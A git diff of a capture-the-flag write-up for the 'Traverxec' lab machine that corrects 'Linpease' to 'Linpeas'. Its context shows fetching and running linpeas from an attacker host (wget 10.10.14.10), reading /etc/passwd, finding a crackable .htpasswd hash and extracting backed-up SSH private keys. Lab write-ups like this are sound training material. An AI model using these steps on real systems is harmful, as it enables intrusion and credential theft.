@@ -132,7 +132,7 @@ We should now have a stable shell!
 
 I think it's important to always have some sort of enumeration running while we're working. So, one of the first things I do on a box is to get some sort of automated enuermation running. For Linux, I like to use `Linpeas`. There's a couple of ways we can get this onto the box, but normally I'll just `wget` it from my kali box.
 
-*On Attacker Machine, in the Linpease directory*
+*On Attacker Machine, in the Linpeas directory*
 ```bash
 python -m SimpleHTTPServer
 ```
@@ -142,16 +142,16 @@ python -m SimpleHTTPServer
 cd /tmp/
 wget 10.10.14.10:8000/linpeas.sh
 ```
-![Linpease](/images/traverxec/linpease-wget.png)
+![Linpeas](/images/traverxec/linpeas-wget.png)
 
-Now that we have Linpease, we use `chmod +x` to make it an executable and then `.\linpease.sh` to run it.
+Now that we have Linpeas, we use `chmod +x` to make it an executable and then `.\linpeas.sh` to run it.
 
-![Linpease](/images/traverxec/linpease.png)
+![Linpeas](/images/traverxec/linpeas.png)
 
 ---
 # Manual Target Enumeration
 
-We have linpease running, so now we can start manually enumerating the box. We check `/etc/passwd` and find the user `David` exists. It also shows us the web root for nostromo is `/var/nostromo/`. The `/var/nostromo/conf` directory, which contains the `.htpasswd` which leaks a crackable hash. We also find the file `nhttpd.conf` which reveals some interesting information. The file has a section called `HOMEDIRS` and hints towards `public_www` folders in a user's home directory.
+We have linpeas running, so now we can start manually enumerating the box. We check `/etc/passwd` and find the user `David` exists. It also shows us the web root for nostromo is `/var/nostromo/`. The `/var/nostromo/conf` directory, which contains the `.htpasswd` which leaks a crackable hash. We also find the file `nhttpd.conf` which reveals some interesting information. The file has a section called `HOMEDIRS` and hints towards `public_www` folders in a user's home directory.
 
 ```bash
 ls -la /home/david/public_www/
@@ -178,14 +178,14 @@ tar -xvf backup-ssh-identity-files.tgz
 ```
 The archive contains SSH keys, one of them being the private key `id_rsa`.
 
-*Before we continue, lets check in on Linpease*
+*Before we continue, lets check in on Linpeas*
 
-![Linpease-Hash](/images/traverxec/linpease-hash.png)
+![Linpeas-Hash](/images/traverxec/linpeas-hash.png)
 
 Looks like it found the same hash we did. Time to crack it!
 
 ---
-## Hashcat
+### Hashcat
 
 > As a disclaimer, this is a small rabbit-hole, but not entirely useless. If you didn't find the hidden directory in David's home directory, this was another way to get the same end result.
 
